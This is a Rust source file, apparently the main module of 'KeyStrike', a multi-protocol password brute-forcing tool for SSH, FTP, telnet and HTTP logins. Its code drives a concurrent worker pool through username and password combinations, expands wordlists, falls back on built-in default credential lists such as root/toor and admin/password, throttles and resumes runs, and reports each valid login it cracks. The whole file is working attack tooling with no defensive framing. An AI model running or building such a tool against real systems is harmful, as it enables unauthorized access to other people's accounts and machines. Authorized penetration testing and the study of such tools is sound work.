//! KeyStrike — multi-protocol brute force engine.
//!
//! The scheduler is a fixed-size worker pool pulling combo indices from an
//! atomic cursor. Memory is O(threads), never O(combos): a 10M-combo run holds
//! the same footprint as a 10-combo run.
//!
//! Output is NDJSON on stdout when `--json` is set, human lines otherwise:
//!   {"status":"progress", ...}   throttled to 4 Hz by a single reporter task
//!   {"status":"found", ...}      emitted the instant a credential lands
//!   {"status":"complete", ...}   terminal summary, includes every hit
//!   {"status":"error", ...}      fatal, process exits non-zero

use clap::Parser;
use serde::Serialize;
use std::io::Write;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex;

mod core;
mod protocols;

use protocols::AuthOutcome;

#[derive(Parser, Debug)]
#[command(
    name = "keystrike",
    version = "3.0.0",
    about = "KeyStrike — multi-protocol brute force engine"
)]
struct Args {
    /// Target host or IP
    #[arg(short = 't', long)]
    target: String,

    /// Target port (0 = protocol default)
    #[arg(short = 'p', long, default_value_t = 0)]
    port: u16,

    /// Protocol name (ssh, ftp, telnet, http, ...)
    #[arg(short = 'P', long)]
    protocol: String,

    /// Single username
    #[arg(short = 'u', long)]
    user: Option<String>,

    /// Username list file
    #[arg(short = 'U', long)]
    userlist: Option<String>,

    /// Single password
    #[arg(short = 'w', long = "pass")]
    pass: Option<String>,

    /// Password list file
    #[arg(short = 'W', long)]
    passlist: Option<String>,

    /// Colon-separated user:pass file (replaces -u/-U/-w/-W)
    #[arg(short = 'C', long)]
    combo_file: Option<String>,

    /// Extra password candidates: n = null, s = same as login, r = reversed login
    #[arg(short = 'e', long = "extra", default_value = "")]
    extra: String,

    /// Stop after the first valid credential
    #[arg(short = 'f', long)]
    stop_on_first: bool,

    /// Concurrent worker count
    #[arg(short = 'T', long, default_value_t = 16)]
    threads: usize,

    /// Per-attempt timeout in seconds
    #[arg(long, default_value_t = 10)]
    timeout: u64,

    /// Retries on a transport error (a denied login is never retried)
    #[arg(long, default_value_t = 1)]
    retries: u32,

    /// Global attempts/second cap (0 = unlimited)
    #[arg(long, default_value_t = 0.0)]
    rate: f64,

    /// Seconds to sleep before each attempt, per worker
    #[arg(long, default_value_t = 0.0)]
    wait: f64,

    /// Resume cursor file: read on start, rewritten every 5 s
    #[arg(long)]
    resume: Option<String>,

    /// Max OS threads available to blocking protocol work
    #[arg(long)]
    max_blocking: Option<usize>,

    /// Emit NDJSON on stdout
    #[arg(long)]
    json: bool,

    /// Expand the password list (case, digits, suffixes)
    #[arg(long)]
    expand_words: bool,

    /// Probe TCP reachability first and exit if the port is closed
    #[arg(long)]
    check: bool,

    /// HTTP request path (default `/`)
    #[arg(long, default_value = "")]
    http_path: String,

    /// HTTP method for form mode: GET or POST
    #[arg(long, default_value = "GET")]
    http_method: String,

    /// HTTP form body template; `^USER^` and `^PASS^` are substituted
    #[arg(long, default_value = "")]
    http_body: String,

    /// Text present only on a failed HTTP login
    #[arg(long, default_value = "")]
    http_fail: String,

    /// Text present only on a successful HTTP login
    #[arg(long, default_value = "")]
    http_success: String,

    /// Extra HTTP header, repeatable (`--http-header "X-Foo: bar"`)
    #[arg(long = "http-header")]
    http_header: Vec<String>,

    /// Force https for HTTP targets regardless of port
    #[arg(long)]
    http_tls: bool,

    /// Send Basic credentials even when the path does not return 401
    #[arg(long)]
    http_force_basic: bool,

    /// Per-attempt chatter on stderr
    #[arg(short = 'v', long)]
    verbose: bool,
}

#[derive(Serialize)]
struct Progress {
    status: &'static str,
    attempted: u64,
    total: u64,
    found: u64,
    speed: f64,
    eta: f64,
    elapsed: f64,
}

#[derive(Serialize, Clone)]
struct FoundCred {
    status: &'static str,
    protocol: String,
    target: String,
    port: u16,
    username: String,
    password: String,
}

// ───────────────────────────── combo source ─────────────────────────────

enum Combos {
    Cartesian {
        users: Vec<String>,
        passes: Vec<String>,
    },
    Explicit(Vec<(String, String)>),
}

impl Combos {
    fn len(&self) -> usize {
        match self {
            Combos::Cartesian { users, passes } => users.len() * passes.len(),
            Combos::Explicit(v) => v.len(),
        }
    }

    fn get(&self, index: usize) -> Option<(&str, &str)> {
        match self {
            Combos::Cartesian { users, passes } => {
                if passes.is_empty() {
                    return None;
                }
                let u = users.get(index / passes.len())?;
                let p = passes.get(index % passes.len())?;
                Some((u.as_str(), p.as_str()))
            }
            Combos::Explicit(v) => v.get(index).map(|(u, p)| (u.as_str(), p.as_str())),
        }
    }
}

fn load_list(path: &str) -> Vec<String> {
    let content = std::fs::read_to_string(path).unwrap_or_default();
    let mut seen = std::collections::HashSet::new();
    content
        .lines()
        .map(|l| l.trim_end_matches(['\r', '\n']).to_string())
        .filter(|l| !l.is_empty())
        .filter(|l| seen.insert(l.clone()))
        .collect()
}

fn load_combos(path: &str) -> Vec<(String, String)> {
    std::fs::read_to_string(path)
        .unwrap_or_default()
        .lines()
        .filter_map(|line| {
            let line = line.trim_end_matches(['\r', '\n']);
            if line.is_empty() || line.starts_with('#') {
                return None;
            }
            let (u, p) = line.split_once(':')?;
            Some((u.to_string(), p.to_string()))
        })
        .collect()
}

fn extra_candidates(users: &[String], spec: &str) -> Vec<String> {
    let mut out = Vec::new();
    let spec = spec.to_ascii_lowercase();
    if spec.contains('n') {
        out.push(String::new());
    }
    if spec.contains('s') {
        out.extend(users.iter().cloned());
    }
    if spec.contains('r') {
        out.extend(users.iter().map(|u| u.chars().rev().collect::<String>()));
    }
    out
}

// ───────────────────────────── output ─────────────────────────────

/// One locked write per line so concurrent workers never interleave a record.
fn emit_json<T: Serialize>(value: &T) {
    let line = serde_json::to_string(value).unwrap_or_default();
    let mut out = std::io::stdout().lock();
    let _ = writeln!(out, "{}", line);
    let _ = out.flush();
}

// ───────────────────────────── checkpoint ─────────────────────────────

fn read_cursor(path: &str) -> u64 {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| s.trim().parse::<u64>().ok())
        .unwrap_or(0)
}

fn write_cursor(path: &str, value: u64) {
    // Write-then-rename: a crash mid-write never leaves a truncated cursor.
    let tmp = format!("{}.tmp", path);
    if std::fs::write(&tmp, value.to_string()).is_ok() {
        let _ = std::fs::rename(&tmp, path);
    }
}

// ───────────────────────────── main ─────────────────────────────

fn main() {
    let args = Args::parse();

    let blocking = args
        .max_blocking
        .unwrap_or_else(|| args.threads.saturating_mul(2).max(512) + 32);
    let workers = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .max(2);

    let runtime = match tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .worker_threads(workers)
        .max_blocking_threads(blocking)
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("[KeyStrike] runtime init failed: {}", e);
            std::process::exit(2);
        }
    };

    let code = runtime.block_on(run(args));
    // Blocking protocol threads may still be draining a timed-out socket.
    runtime.shutdown_timeout(Duration::from_millis(250));
    std::process::exit(code);
}

async fn run(args: Args) -> i32 {
    let protocol_name = args.protocol.to_ascii_lowercase();
    let port = if args.port == 0 {
        protocols::default_port(&protocol_name)
    } else {
        args.port
    };

    if port == 0 {
        emit_json(&serde_json::json!({
            "status": "error",
            "message": format!("unknown protocol: {}", protocol_name),
        }));
        return 1;
    }

    let mut users: Vec<String> = if let Some(ref u) = args.user {
        vec![u.clone()]
    } else if let Some(ref ul) = args.userlist {
        load_list(ul)
    } else {
        Vec::new()
    };

    let mut passes: Vec<String> = if let Some(ref p) = args.pass {
        vec![p.clone()]
    } else if let Some(ref pl) = args.passlist {
        load_list(pl)
    } else {
        Vec::new()
    };

    let combos = if let Some(ref cf) = args.combo_file {
        let explicit = load_combos(cf);
        if explicit.is_empty() {
            emit_json(&serde_json::json!({
                "status": "error",
                "message": format!("no user:pass pairs in {}", cf),
            }));
            return 1;
        }
        Combos::Explicit(explicit)
    } else {
        if users.is_empty() {
            users = vec![
                "root".into(),
                "admin".into(),
                "user".into(),
                "administrator".into(),
                "test".into(),
            ];
        }
        if passes.is_empty() {
            passes = vec![
                "".into(),
                "root".into(),
                "admin".into(),
                "password".into(),
                "123456".into(),
                "12345".into(),
                "1234".into(),
                "toor".into(),
                "qwerty".into(),
                "letmein".into(),
            ];
        }
        if args.expand_words {
            passes = core::WordlistGenerator::expand(&passes, 99, true);
            users = core::WordlistGenerator::expand(&users, 9, false);
        }
        for candidate in extra_candidates(&users, &args.extra) {
            if !passes.contains(&candidate) {
                passes.push(candidate);
            }
        }
        Combos::Cartesian { users, passes }
    };

    let total = combos.len() as u64;
    if total == 0 {
        emit_json(&serde_json::json!({
            "status": "error",
            "message": "empty combo set — supply users and passwords",
        }));
        return 1;
    }

    if args.check {
        match tokio::time::timeout(
            Duration::from_secs(args.timeout.max(3)),
            tokio::net::TcpStream::connect((args.target.as_str(), port)),
        )
        .await
        {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                emit_json(&serde_json::json!({
                    "status": "error",
                    "message": format!("{}:{} unreachable — {}", args.target, port, e),
                }));
                return 1;
            }
            Err(_) => {
                emit_json(&serde_json::json!({
                    "status": "error",
                    "message": format!("{}:{} connect timed out", args.target, port),
                }));
                return 1;
            }
        }
    }

    let cursor = Arc::new(AtomicU64::new(match args.resume {
        Some(ref path) => read_cursor(path).min(total),
        None => 0,
    }));
    let attempted = Arc::new(AtomicU64::new(0));
    let found_count = Arc::new(AtomicU64::new(0));
    let transport_errors = Arc::new(AtomicU64::new(0));
    let stop = Arc::new(AtomicBool::new(false));
    let finished = Arc::new(AtomicBool::new(false));
    let results = Arc::new(Mutex::new(Vec::<FoundCred>::new()));
    let start = Instant::now();

    let rate = if args.rate > 0.0 {
        Some(Arc::new(core::RateLimiter::new(args.rate, args.rate.min(64.0))))
    } else {
        None
    };

    let protocol = protocol_name.clone();
    let target = args.target.clone();
    let stop_on_first = args.stop_on_first;
    let retries = args.retries;
    let timeout = args.timeout;
    let wait = args.wait;
    let json_mode = args.json;
    let verbose = args.verbose;
    let combos = Arc::new(combos);
    let opts = Arc::new(protocols::ProtoOpts {
        http_path: args.http_path.clone(),
        http_method: args.http_method.clone(),
        http_body: args.http_body.clone(),
        http_fail: args.http_fail.clone(),
        http_success: args.http_success.clone(),
        http_header: args.http_header.clone(),
        http_tls: args.http_tls,
        http_force_basic: args.http_force_basic,
        source: String::new(),
    });

    // Interrupt handling: first Ctrl-C drains workers and prints a summary,
    // second one hard-exits.
    {
        let stop = stop.clone();
        tokio::spawn(async move {
            let _ = tokio::signal::ctrl_c().await;
            stop.store(true, Ordering::SeqCst);
            let _ = tokio::signal::ctrl_c().await;
            std::process::exit(130);
        });
    }

    let mut workers = Vec::with_capacity(args.threads);
    for _ in 0..args.threads {
        let cursor = cursor.clone();
        let attempted = attempted.clone();
        let found_count = found_count.clone();
        let transport_errors = transport_errors.clone();
        let stop = stop.clone();
        let results = results.clone();
        let rate = rate.clone();
        let combos = combos.clone();
        let protocol = protocol.clone();
        let target = target.clone();
        let opts = opts.clone();

        let handle = tokio::spawn(async move {
            loop {
                if stop.load(Ordering::Relaxed) {
                    break;
                }
                let index = cursor.fetch_add(1, Ordering::Relaxed);
                if index >= total {
                    break;
                }
                let Some((user, pass)) = combos.get(index as usize) else {
                    break;
                };

                if let Some(ref rl) = rate {
                    let delay = rl.acquire().await;
                    if !delay.is_zero() {
                        tokio::time::sleep(delay).await;
                    }
                }
                if wait > 0.0 {
                    tokio::time::sleep(Duration::from_secs_f64(wait)).await;
                }

                let mut attempt = 0u32;
                let outcome = loop {
                    let result = tokio::time::timeout(
                        Duration::from_secs(timeout + 2),
                        protocols::try_auth(&protocol, &target, port, user, pass, timeout, &opts),
                    )
                    .await;
                    let outcome = match result {
                        Ok(o) => o,
                        Err(_) => AuthOutcome::Error("attempt timeout".into()),
                    };
                    match &outcome {
                        AuthOutcome::Error(_) if attempt < retries => {
                            attempt += 1;
                            tokio::time::sleep(Duration::from_millis(150 * attempt as u64)).await;
                            continue;
                        }
                        _ => break outcome,
                    }
                };

                attempted.fetch_add(1, Ordering::Relaxed);

                match outcome {
                    AuthOutcome::Success => {
                        found_count.fetch_add(1, Ordering::Relaxed);
                        let cred = FoundCred {
                            status: "found",
                            protocol: protocol.clone(),
                            target: target.clone(),
                            port,
                            username: user.to_string(),
                            password: pass.to_string(),
                        };
                        if json_mode {
                            emit_json(&cred);
                        } else {
                            let mut out = std::io::stdout().lock();
                            let _ = writeln!(
                                out,
                                "[+] {}:{} @ {}:{} ({})",
                                user, pass, target, port, protocol
                            );
                            let _ = out.flush();
                        }
                        results.lock().await.push(cred);
                        if stop_on_first {
                            stop.store(true, Ordering::SeqCst);
                            break;
                        }
                    }
                    AuthOutcome::Denied => {
                        if verbose {
                            eprintln!("[-] {}:{} denied", user, pass);
                        }
                    }
                    AuthOutcome::Error(e) => {
                        transport_errors.fetch_add(1, Ordering::Relaxed);
                        if verbose {
                            eprintln!("[!] {}:{} {}", user, pass, e);
                        }
                    }
                }
            }
        });
        workers.push(handle);
    }

    // Single reporter: progress at 4 Hz, checkpoint at 0.2 Hz. Workers never
    // touch stdout for progress, so ordering is stable and the clock is one.
    let reporter = {
        let attempted = attempted.clone();
        let found_count = found_count.clone();
        let cursor = cursor.clone();
        let stop = stop.clone();
        let finished = finished.clone();
        let resume = args.resume.clone();
        tokio::spawn(async move {
            let mut ema = 0.0f64;
            let mut last_attempted = 0u64;
            let mut last_checkpoint = Instant::now();
            loop {
                tokio::time::sleep(Duration::from_millis(250)).await;
                let now_attempted = attempted.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs_f64();
                let delta = now_attempted.saturating_sub(last_attempted) as f64;
                last_attempted = now_attempted;
                let instant = delta / 0.25;
                ema = if ema == 0.0 { instant } else { ema * 0.7 + instant * 0.3 };
                let eta = if ema > 0.1 {
                    (total.saturating_sub(now_attempted)) as f64 / ema
                } else {
                    0.0
                };

                if json_mode {
                    emit_json(&Progress {
                        status: "progress",
                        attempted: now_attempted,
                        total,
                        found: found_count.load(Ordering::Relaxed),
                        speed: ema,
                        eta,
                        elapsed,
                    });
                } else if !finished.load(Ordering::Relaxed) {
                    let pct = if total > 0 {
                        now_attempted as f64 / total as f64 * 100.0
                    } else {
                        0.0
                    };
                    eprint!(
                        "\r[KeyStrike] {}/{} ({:.1}%) | {:.1}/s | eta {:.0}s | found {}   ",
                        now_attempted,
                        total,
                        pct,
                        ema,
                        eta,
                        found_count.load(Ordering::Relaxed)
                    );
                    let _ = std::io::stderr().flush();
                }

                if let Some(ref path) = resume {
                    if last_checkpoint.elapsed() >= Duration::from_secs(5) {
                        write_cursor(path, cursor.load(Ordering::Relaxed).min(total));
                        last_checkpoint = Instant::now();
                    }
                }

                if finished.load(Ordering::Relaxed) || stop.load(Ordering::Relaxed) {
                    break;
                }
            }
        })
    };

    for handle in workers {
        let _ = handle.await;
    }
    finished.store(true, Ordering::SeqCst);
    let _ = reporter.await;

    if let Some(ref path) = args.resume {
        write_cursor(path, total);
    }

    let elapsed = start.elapsed().as_secs_f64();
    let done = attempted.load(Ordering::Relaxed);
    let speed = if elapsed > 0.0 { done as f64 / elapsed } else { 0.0 };
    let found = results.lock().await.clone();

    if json_mode {
        emit_json(&serde_json::json!({
            "status": "complete",
            "protocol": protocol_name,
            "target": args.target,
            "port": port,
            "total_attempts": done,
            "total_combos": total,
            "elapsed": elapsed,
            "speed": format!("{:.0}/s", speed),
            "speed_raw": speed,
            "found": found.len(),
            "transport_errors": transport_errors.load(Ordering::Relaxed),
            "stopped_early": stop_on_first && !found.is_empty(),
            "results": found,
        }));
    } else {
        if !finished.load(Ordering::Relaxed) {
            eprintln!();
        }
        eprintln!(
            "\n[KeyStrike] done — {:.1}s | {:.1}/s | {} attempts | {} found",
            elapsed,
            speed,
            done,
            found.len()
        );
    }

    0
}
